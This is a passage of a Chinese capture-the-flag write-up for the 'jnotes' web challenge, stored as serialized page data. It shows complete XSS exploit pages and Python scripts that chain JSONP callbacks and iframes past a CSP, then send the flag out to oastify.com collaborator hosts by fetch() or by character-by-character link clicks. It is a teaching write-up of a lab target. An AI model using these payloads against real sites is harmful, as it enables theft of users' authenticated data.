punctuation\\\"\u003e\u0026lt;\u003c/span\u003eiframe\u003c/span\u003e \u003cspan class=\\\"token attr-name\\\"\u003esrcdoc\u003c/span\u003e\u003cspan class=\\\"token attr-value\\\"\u003e\u003cspan class=\\\"token punctuation attr-equals\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e\\\"\u003c/span\u003e\\n    \u0026lt;form method='POST' action='{{target}}/view.js'\u003e\\n    \u0026lt;script\u003e\\n        document.forms[0].submit();\\n    \u0026lt;/script\u003e\\n\u003cspan class=\\\"token punctuation\\\"\u003e\\\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\\\"token tag\\\"\u003e\u003cspan class=\\\"token tag\\\"\u003e\u003cspan class=\\\"token punctuation\\\"\u003e\u0026lt;/\u003c/span\u003eiframe\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"我使用Flask作为托管攻击页面的服务器，\u003ccode class=\\\"x-inline-highlight\\\"\u003etarget\u003c/code\u003e在这里是这道题目的地址。这个\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e通过POST方法请求加载\u003ccode class=\\\"x-inline-highlight\\\"\u003e/view.js\u003c/code\u003e，这会导致定义的路由均失配，最终匹配到\u003ccode class=\\\"x-inline-highlight\\\"\u003e*path\u003c/code\u003e并返回\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex\u003c/code\u003e页面；并且这个页面的\u003ccode class=\\\"x-inline-highlight\\\"\u003elocation.href\u003c/code\u003e会变成\u003ccode class=\\\"x-inline-highlight\\\"\u003e/view.js\u003c/code\u003e：\"}}],[\"$\",\"$L21\",null,{\"src\":\"1.jpg\",\"filterDarkTheme\":true}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"（如果不用\u003ccode class=\\\"x-inline-highlight\\\"\u003esrcdoc\u003c/code\u003e而是\u003ccode class=\\\"x-inline-highlight\\\"\u003esrc=\\\".../view.js\\\"\u003c/code\u003e，则会返回纯文本的JavaScript代码内容，这样就没有办法加载\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex\u003c/code\u003e页面了。）\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Step 2\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"现在\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex\u003c/code\u003e页面中有我们需要的jQuery库和\u003ccode class=\\\"x-inline-highlight\\\"\u003e#noteContent\u003c/code\u003e元素，但是\u003ccode class=\\\"x-inline-highlight\\\"\u003eshowNote\u003c/code\u003e函数是未定义的，而这个函数就是定义在\u003ccode class=\\\"x-inline-highlight\\\"\u003e/view.js\u003c/code\u003e中。因此我们上一步将第一个\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e的\u003ccode class=\\\"x-inline-highlight\\\"\u003elocation.href\u003c/code\u003e操作成\u003ccode class=\\\"x-inline-highlight\\\"\u003e/view.js\u003c/code\u003e，就是为了这一步空参调用\u003ccode class=\\\"x-inline-highlight\\\"\u003e$._evalUrl\u003c/code\u003e做铺垫。空参调用时默认使用\u003ccode class=\\\"x-inline-highlight\\\"\u003elocation.href\u003c/code\u003e做参数，也就会解析执行我们需要的\u003ccode class=\\\"x-inline-highlight\\\"\u003e/view.js\u003c/code\u003e了。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"现在在攻击页面中添加下面的代码：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"HTML\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003cscript\u003e\\n    const iframe2 = document.createElement(\\\"iframe\\\");\\n    iframe2.src = \\\"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23\\\";\\n    document.body.appendChild(iframe2);\\n\u003c/script\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$22\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"利用前面提到的劫持\u003ccode class=\\\"x-inline-highlight\\\"\u003ecallback\u003c/code\u003e的方法，通过引入第二个\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e，相当于执行了\u003ccode class=\\\"x-inline-highlight\\\"\u003etop.frames[0].$._evalUrl()\u003c/code\u003e。（注意传入的\u003ccode class=\\\"x-inline-highlight\\\"\u003enote_id\u003c/code\u003e是\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\"anything\\\"\u003c/code\u003e，后端并不会匹配到合法的\u003ccode class=\\\"x-inline-highlight\\\"\u003enote\u003c/code\u003e对象。）\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这个操作实际上是在第一个\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e中定义了\u003ccode class=\\\"x-inline-highlight\\\"\u003eshowNote\u003c/code\u003e函数。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Step 3\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"回顾一下我们目前做了什么：我们的第一个\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e页面是与\u003ccode class=\\\"x-inline-highlight\\\"\u003etarget\u003c/code\u003e同源的，也加载了jQuery库，并且也有\u003ccode class=\\\"x-inline-highlight\\\"\u003e#noteContent\u003c/code\u003e元素；我们通过引入第二个\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e触发JSONP，间接地在第一个\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e中完成了对\u003ccode class=\\\"x-inline-highlight\\\"\u003eshowNote\u003c/code\u003e函数的定义。重要的是，第一个\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e页面中是没有CSP限制的，因此我们可以在这个页面中渲染恶意笔记，触发XSS。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"我们在Flask服务端代码中创建一个笔记，并把\u003ccode class=\\\"x-inline-highlight\\\"\u003enote_id\u003c/code\u003e保存下来，传给模板：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"\u003cimg src=x onerror='alert(0)'\u003e\\\"\\nresp = requests.post(target + \\\"/api/post\\\", json={\\\"noteContent\\\": payload, \\\"noteTitle\\\": \\\"anything\\\"})\\nnote_id = resp.json()[\\\"id\\\"]\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$23\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"HTML\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003cscript\u003e\\n    const sleep = (ms) =\u003e new Promise(resolve =\u003e setTimeout(resolve, ms));\\n    (async () =\u003e {\\n        await sleep(5000);\\n        const iframe2 = document.createElement(\\\"iframe\\\");\\n        iframe2.src = \\\"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23\\\";\\n        document.body.appendChild(iframe2);\\n\\n        await sleep(1000);\\n        const iframe3 = document.createElement(\\\"iframe\\\");\\n        iframe3.src = \\\"{{target}}/note/{{note_id}}%3fcallback=top.frames[0].showNote%23\\\";\\n        document.body.appendChild(iframe3);\\n    })();\\n\u003c/script\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$24\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这次我们通过引入第三个\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e触发JSONP，间接地在第一个\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e中执行了\u003ccode class=\\\"x-inline-highlight\\\"\u003eshowNote\u003c/code\u003e函数，渲染了包含\u003ccode class=\\\"x-inline-highlight\\\"\u003epayload\u003c/code\u003e的笔记内容，实现了XSS。为了保证正确的执行顺序，在加载每个\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e前加入了延时。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Step 4\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"正式利用时需要对\u003ccode class=\\\"x-inline-highlight\\\"\u003epayload\u003c/code\u003e稍作修改，引入带外逻辑；同时由于\u003ccode class=\\\"x-inline-highlight\\\"\u003ecookie\u003c/code\u003e是没有\u003ccode class=\\\"x-inline-highlight\\\"\u003eSameSite=None\u003c/code\u003e的，因此直接在\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e中访问\u003ccode class=\\\"x-inline-highlight\\\"\u003e/api/flag\u003c/code\u003e时是没有\u003ccode class=\\\"x-inline-highlight\\\"\u003ecookie\u003c/code\u003e的，需要通过\u003ccode class=\\\"x-inline-highlight\\\"\u003ewindow.open\u003c/code\u003e打开一个新窗口来访问。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"完整代码\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"最终的攻击页面代码如下：\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex.html\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"HTML\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003c!DOCTYPE html\u003e\\n\u003chtml lang=\\\"en\\\"\u003e\\n\u003chead\u003e\\n    \u003ctitle\u003eExploit\u003c/title\u003e\\n\u003c/head\u003e\\n\u003cbody\u003e\\n\u003ciframe srcdoc=\\\"\\n    \u003cform method='POST' action='{{target}}/view.js'\u003e\\n    \u003cscript\u003e\\n        document.forms[0].submit();\\n    \u003c/script\u003e\\n\\\"\u003e\u003c/iframe\u003e\\n\u003cscript\u003e\\n    const sleep = (ms) =\u003e new Promise(resolve =\u003e setTimeout(resolve, ms));\\n    (async () =\u003e {\\n        await sleep(5000);\\n        const iframe2 = document.createElement(\\\"iframe\\\");\\n        iframe2.src = \\\"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23\\\";\\n        document.body.appendChild(iframe2);\\n\\n        await sleep(1000);\\n        const iframe3 = document.createElement(\\\"iframe\\\");\\n        iframe3.src = \\\"{{target}}/note/{{note_id}}%3fcallback=top.frames[0].showNote%23\\\";\\n        document.body.appendChild(iframe3);\\n    })();\\n\u003c/script\u003e\\n\u003c/body\u003e\\n\u003c/html\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$25\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eexp.py\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"from flask import Flask, render_template\\nimport requests\\n\\ntarget = \\\"https://jnotes-web.chal.idek.team\\\"\\n\\npayload = \\\"\\\"\\\"\u003cimg src=x onerror='\\n    const sleep = (ms) =\u003e new Promise(resolve =\u003e setTimeout(resolve, ms));\\n    const tab = window.open(`/api/flag`);\\n    sleep(3000).then(() =\u003e fetch(\\\"//ta7dkoi5sodij8u1k6eft29ybphg56tv.oastify.com/?flag=\\\" + tab.document.body.innerText));\\n'\u003e\\\"\\\"\\\"\\n\\nresp = requests.post(target + \\\"/api/post\\\", json={\\\"noteContent\\\": payload, \\\"noteTitle\\\": \\\"anything\\\"})\\nnote_id = resp.json()[\\\"id\\\"]\\nprint(note_id)\\n\\napp = Flask(__name__, template_folder=\\\".\\\")\\n\\n\\n@app.route(\\\"/\\\")\\ndef index():\\n    return render_template(\\\"index.html\\\", target=target, note_id=note_id)\\n\\n\\napp.run(\\\"0.0.0.0\\\", 5003)\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$26\"}}]}]]}],[\"$\",\"$L21\",null,{\"src\":\"2.jpg\",\"filterDarkTheme\":true}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"Community Solution\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"首先除了通过\u003ccode class=\\\"x-inline-highlight\\\"\u003e/note/anything%3fcallback=alert%23\u003c/code\u003e来触发\u003ccode class=\\\"x-inline-highlight\\\"\u003ealert\u003c/code\u003e，还有一种方法是设置笔记的内容为：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"HTML\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003ciframe srcdoc='\u003cscript src=\\\"/api/view/anything?callback=alert\\\"\u003e\u003c/script\u003e'\u003e\u003c/iframe\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token tag\\\"\u003e\u003cspan class=\\\"token tag\\\"\u003e\u003cspan class=\\\"token punctuation\\\"\u003e\u0026lt;\u003c/span\u003eiframe\u003c/span\u003e \u003cspan class=\\\"token attr-name\\\"\u003esrcdoc\u003c/span\u003e\u003cspan class=\\\"token attr-value\\\"\u003e\u003cspan class=\\\"token punctuation attr-equals\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e'\u003c/span\u003e\u0026lt;script src=\\\"/api/view/anything?callback=alert\\\"\u003e\u0026lt;/script\u003e\u003cspan class=\\\"token punctuation\\\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\\\"token tag\\\"\u003e\u003cspan class=\\\"token tag\\\"\u003e\u003cspan class=\\\"token punctuation\\\"\u003e\u0026lt;/\u003c/span\u003eiframe\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"然后正常访问这个笔记（\u003ccode class=\\\"x-inline-highlight\\\"\u003e/note/...\u003c/code\u003e）就会触发\u003ccode class=\\\"x-inline-highlight\\\"\u003ealert\u003c/code\u003e；因此后面我想通过\u003ccode class=\\\"x-inline-highlight\\\"\u003ea\u003c/code\u003e标签的\u003ccode class=\\\"x-inline-highlight\\\"\u003ehref\u003c/code\u003e带外，因为通过JSONP可以触发点击事件，但是在\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e中的\u003ccode class=\\\"x-inline-highlight\\\"\u003ea\u003c/code\u003e标签点击时会被CSP限制：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"Refused to frame '...' because it violates the following Content Security Policy directive: \\\"default-src 'none'\\\". Note that 'frame-src' was not explicitly set, so 'default-src' is used as a fallback.\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"Refused to frame '...' because it violates the following Content Security Policy directive: \\\"default-src 'none'\\\". Note that 'frame-src' was not explicitly set, so 'default-src' is used as a fallback.\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"我一直以为这个是无法绕过的，但其实只需要给\u003ccode class=\\\"x-inline-highlight\\\"\u003ea\u003c/code\u003e标签添加\u003ccode class=\\\"x-inline-highlight\\\"\u003etarget=\\\"_blank\\\"\u003c/code\u003e或\u003ccode class=\\\"x-inline-highlight\\\"\u003etarget=\\\"_top\\\"\u003c/code\u003e属性就可以了。顺着这个思路，看到一个有意思的民间解法，同样是构造一个攻击页面：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"HTML\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003cscript\u003e\\n    window.open(\\\"{{target}}/note/{{note_id}}\\\");\\n    location.href = \\\"{{target}}/api/flag\\\";\\n\u003c/script\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token tag\\\"\u003e\u003cspan class=\\\"token tag\\\"\u003e\u003cspan class=\\\"token punctuation\\\"\u003e\u0026lt;\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\\\"token script\\\"\u003e\u003cspan class=\\\"token language-javascript\\\"\u003e\\n    window\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token function\\\"\u003eopen\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"{{target}}/note/{{note_id}}\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n    location\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003ehref \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"{{target}}/api/flag\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\\\"token tag\\\"\u003e\u003cspan class=\\\"token tag\\\"\u003e\u003cspan class=\\\"token punctuation\\\"\u003e\u0026lt;/\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"在访问这个页面时，会打开一个新窗口加载笔记，然后当前窗口跳转到\u003ccode class=\\\"x-inline-highlight\\\"\u003e/api/flag\u003c/code\u003e；\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"在笔记页面，创建多个\u003ccode class=\\\"x-inline-highlight\\\"\u003ea\u003c/code\u003e标签：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"i = 9\\n# {\\\"flag\\\":\\\"idek{...}\\\"}\\n#          ^\\n#         i=9\\n\\nanchors = \\\"\\\\n\\\".join([\\n    f'\u003ca id=\\\"{ch}\\\" href=\\\"//caqwk7ios7d1jrukkpeytl9hb8hz5sth.oastify.com/?flag_{i - 9}={ch}\\\" target=\\\"_blank\\\"\u003e{ch}\u003c/a\u003e'\\n    for ch in \\\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}\\\"\\n])\\npayload = f\\\"\\\"\\\"\\n    \u003ciframe srcdoc='\\n        {anchors}\\n        \u003cscript src=\\\"/api/view/anything?callback=window[top.opener.document.body.innerText[{i}]].click\\\"\u003e\u003c/script\u003e\\n    '\u003e\u003c/iframe\u003e\\n\\\"\\\"\\\"\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$27\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"为\u003ccode class=\\\"x-inline-highlight\\\"\u003ea\u003c/code\u003e标签设置了\u003ccode class=\\\"x-inline-highlight\\\"\u003eid=xxx\u003c/code\u003e后，可以通过window.xxx访问到这个元素；（对任意标签都适用）\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"注意这些\u003ccode class=\\\"x-inline-highlight\\\"\u003ea\u003c/code\u003e标签是在\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e中定义并被点击的，而这里的\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e作为笔记内容被加载；此时JSONP回调中：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003etop\u003c/code\u003e取得的是笔记页面的\u003ccode class=\\\"x-inline-highlight\\\"\u003ewindow\u003c/code\u003e对象；\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003etop.opener\u003c/code\u003e取得的是攻击页面的\u003ccode class=\\\"x-inline-highlight\\\"\u003ewindow\u003c/code\u003e对象；（因为是通过攻击页面\u003ccode class=\\\"x-inline-highlight\\\"\u003ewindow.open\u003c/code\u003e打开的笔记页面）\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"攻击页面在打开笔记页面后，立刻跳转到了\u003ccode class=\\\"x-inline-highlight\\\"\u003e/api/flag\u003c/code\u003e，此时\u003ccode class=\\\"x-inline-highlight\\\"\u003etop.opener.document.body.innerText\u003c/code\u003e就是flag的内容了！因此这里\u003ccode class=\\\"x-inline-highlight\\\"\u003etop.opener.document.body.innerText[...]\u003c/code\u003e刚好取到了\u003ccode class=\\\"x-inline-highlight\\\"\u003e/api/flag\u003c/code\u003e的响应的第\u003ccode class=\\\"x-inline-highlight\\\"\u003ei\u003c/code\u003e个字符；\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ewindow[...]\u003c/code\u003e又拿到了对应的\u003ccode class=\\\"x-inline-highlight\\\"\u003ea\u003c/code\u003e标签，最后通过\u003ccode class=\\\"x-inline-highlight\\\"\u003eclick\u003c/code\u003e带外。\"}}]}]]}]]}]]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"完整代码\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"最终的攻击页面代码如下：\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex.html\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"HTML\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003c!DOCTYPE html\u003e\\n\u003chtml lang=\\\"en\\\"\u003e\\n\u003chead\u003e\\n    \u003ctitle\u003eExploit\u003c/title\u003e\\n\u003c/head\u003e\\n\u003cbody\u003e\\n\u003cscript\u003e\\n    window.open(\\\"{{target}}/note/{{note_id}}\\\");\\n    location.href = \\\"{{target}}/api/flag\\\";\\n\u003c/script\u003e\\n\u003c/body\u003e\\n\u003c/html\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$28\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eexp.py\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"from flask import Flask, render_template\\nimport requests\\n\\ntarget = \\\"https://jnotes-web.chal.idek.team\\\"\\n\\ni = 9\\n# {\\\"flag\\\":\\\"idek{...}\\\"}\\n#          ^\\n#         i=9\\n\\nanchors = \\\"\\n\\n    f'\u003ca id=\\\"{ch}\\\" href=\\\"//caqwk7ios7d1jrukkpeytl9hb8hz5sth.oastify.com/?flag_{i - 9}={ch}\\\" target=\\\"_blank\\\"\u003e{ch}\u003c/a\u003e'\\n    for ch in \\\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}\\\"\\n])\\npayload = f\\\"\\\"\\\"\\n    \u003ciframe srcdoc='\\n        {anchors}\\n        \u003cscript src=\\\"/api/view/anything?callback=window[top.opener.document.body.innerText[{i}]].click\\\"\u003e\u003c/script\u003e\\n    '\u003e\u003c/iframe\u003e\\n\\\"\\\"\\\"\\n\\nresp = requests.post(target + \\\"/api/post\\\", json={\\\"noteContent\\\": payload, \\\"noteTitle\\\": \\\"anything\\\"})\\nnote_id = resp.json()[\\\"id\\\"]\\nprint(note_id)\\n\\napp = Flask(__name__, template_folder=\\\".\\\")\\n\\n\\n@app.route(\\\"/\\\")\\ndef index():\\n    return 